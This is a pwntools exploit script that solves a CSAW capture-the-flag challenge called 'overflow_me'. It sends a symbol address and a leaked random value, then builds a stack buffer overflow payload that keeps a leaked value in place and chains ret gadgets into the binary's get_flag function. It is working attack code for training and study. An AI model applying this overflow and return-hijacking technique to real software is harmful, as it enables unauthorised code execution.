from pwn import * 

#initialisation
exe = './overflow_me'
elf = ELF(exe, checksec=False )
context.log_level = 'debug'
context.binary = exe
rop = ROP(elf)

#establishing connection
host = 'chals.ctf.csaw.io' 
port = 21006
#p = remote(host ,port )
p = process(exe)

#exploit
secret_key_adr = elf.symbols['secret_key']
p.recvuntil(b"Tell me its addres")
p.send(p64(secret_key_adr))
p.recvline()
rand_val = int(p.recvline().strip(), 16)
print("random value : ", hex(rand_val))
p.recvuntil(b"Of course there's a key. There always is. If you speak it, the story unlocks\n")
p.send(p64(rand_val))

p.recvuntil(b"It has something for you: ")
val = p.recvline().strip()
print("val  = " ,hex(int(val,16)))
ret = rop.find_gadget(['ret'])[0]

payload = b'A'*64 + p64(int(val, 16)) +b'B'*8 +p64(ret) +p64(ret) +p64(elf.symbols['get_flag']) 
print("payload : ", payload.hex())

p.recvuntil(b"Your turn now. Write yourself into this story.\n")

p.send(payload)

p.interactive()
